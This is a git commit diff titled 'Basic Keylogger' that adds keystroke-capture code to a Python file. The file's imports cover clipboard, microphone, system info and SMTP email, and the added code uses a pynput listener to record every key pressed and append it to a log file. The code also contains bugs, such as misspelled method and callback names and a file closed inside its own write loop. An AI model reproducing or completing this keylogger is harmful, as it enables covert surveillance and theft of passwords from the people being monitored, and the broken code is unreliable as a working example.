909266b4305cfaacf445bbe9c8b66ad7e6227fdb
Gnyan Sai <asapannagnyansai1167@gmail.com>
2025-06-05 19:11:29 +0530

    Basic Keylogger

--- project/keylogger.py
+++ project/keylogger.py
@@ -4,15 +4,15 @@
 import socket
 import platform
 
-# Library for clipboard.
-import win32clipboard
+# Library for system info & time.
+import time
+import os
 
 # Library for registring keystrokes.
 from pynput.keyboard import Key, Listener
 
-# Library for system info & time.
-import time
-import os
+# Library for clipboard.
+import win32clipboard
 
 # Library for mic capabilities.
 from scipy.io.wavfile import write
@@ -34,3 +34,35 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import smtplib
+
+# Log file 
+
+keys_info = "key_log.txt"
+
+file_path = "C:\\Users\\asapa\\Desktop\\ADVANCED KEYLOGGER\\project"
+extend = "\\"
+
+count = 0
+keys = []
+
+def on_press(key):
+    global keys, count
+    
+    print(key)
+    keys.appen(key)
+    count += 1
+    
+def  write_file(keys):
+    with open(file_path + extend + keys_info, "a") as k:
+        for key in keys:
+            c = str(key).replace("'", " ")
+            if c.find ("space") > 0:
+                k.write('\n')
+                k.close()
+                
+def on_relese(key):
+    if key == Key.esc:
+        return False
+    
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
